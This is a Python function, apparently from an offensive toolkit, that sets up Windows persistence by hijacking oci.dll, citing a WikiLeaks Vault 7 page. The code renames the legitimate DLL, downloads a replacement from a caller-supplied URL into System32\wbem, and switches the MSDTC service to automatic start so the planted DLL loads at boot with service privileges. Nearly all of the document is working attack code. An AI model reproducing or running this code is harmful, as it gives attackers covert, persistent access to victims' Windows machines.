def oci_dll_hijack(url,rename_dll):
	"""
	https://wikileaks.org/ciav7p1/cms/page_2621767.html
	
	Windows contains a service called "Distributed Transaction Coordinator" that is
	configured to "Manual" start by default. This service causes a DLL called
	"C:\Windows\System32\wbem\oci.dll" to load into the "Network Services" group.
	By placing our own DLL in this location and configuring the service to start
	automatially, we have a persistence mechanism with system privileges. The service
	runs under the "Network Service" account, which is a restricted account that has
	privileges to access the network.
	"""
	dll = "oci.dll"
	dll_path = "C:\Windows\System32\wbem"
	
	if (rename_dll == 1):
		if (os.path.isfile(os.path.join(dll_path,dll)) == True):
			try:
				os.rename(os.path.join(dll_path,dll),os.path.join(dll_path,"oci.dll.old"))
			except Exception as e:
				return False

	try:
		download = requests.get(url)
		if (len(download.content) > 1):
			with open(os.path.join(dll_path,dll),"wb") as dll_file:
				dll_file.write(download.content)
				dll_file.close()
			if (os.path.isfile(os.path.join(dll_path,dll)) == True):
				try:
					popen = os.popen("sc qc msdtc & sc config msdtc start=auto & sc qc msdtc")
					return True
				except Exception as e:
					return False
		else:
			return False
	except Exception as e:
		return False
